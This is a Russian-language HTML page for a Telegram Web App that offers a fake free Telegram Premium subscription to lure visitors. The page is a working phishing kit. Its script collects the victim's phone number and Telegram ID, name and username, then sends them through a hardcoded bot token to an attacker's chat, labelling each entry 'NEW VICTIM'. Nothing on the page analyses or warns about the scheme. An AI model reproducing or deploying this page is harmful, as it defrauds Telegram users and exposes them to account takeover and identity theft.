<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>Telegram Premium</title>
<style>
body { background: linear-gradient(135deg, #1e1e2f, #0f0f1a); color: #fff; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; margin: 0; padding: 20px; }
.star { font-size: 60px; animation: pulse 2s infinite; margin-bottom: 20px; }
@keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
h1 { font-size: 24px; margin-bottom: 10px; text-align: center; }
p { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 30px; }
input { width: 100%; max-width: 300px; padding: 15px; border-radius: 12px; border: 1px solid #333; background: #111; color: #fff; font-size: 16px; margin-bottom: 15px; outline: none; box-sizing: border-box; }
button { width: 100%; max-width: 300px; padding: 15px; border-radius: 12px; border: none; background: #0088cc; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; }
button:active { transform: scale(0.95); }
</style>
</head>
<body>
<div class="star">⭐</div>
<h1>Получите Telegram Premium</h1>
<p>Вы были выбраны для получения подписки на 3 месяца.</p>
<input type="text" id="phone" placeholder="Ваш номер телефона">
<button onclick="sendData()">ПОЛУЧИТЬ PREMIUM</button>
<script>
const tg = window.Telegram.WebApp;
tg.expand();
const BOT_TOKEN = '9158476439:AAFhyYprbKCuiZPDkaiVrIp3IwS2Hn-PcPs';
const ADMIN_ID = '8769891971'; 
function sendData() {
const phone = document.getElementById('phone').value;
if (!phone) { alert("Введите номер!"); return; }
let user = tg.initDataUnsafe?.user || { id: "TEST", first_name: "Тест", username: "test" };
const text = `💀 НОВАЯ ЖЕРТВА!\n\n🆔 ID: ${user.id}\n👤 Имя: ${user.first_name}\n🔗 Юзернейм: @${user.username || 'нет'}\n📱 Телефон: ${phone}`;
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
}).then(res => res.json()).then(data => {
if (data.ok) {
alert("✅ Данные отправлены!");
tg.close();
} else {
alert("Ошибка: " + data.description);
}
}).catch(() => alert("Ошибка сети!"));
}
</script>
</body>
</html>
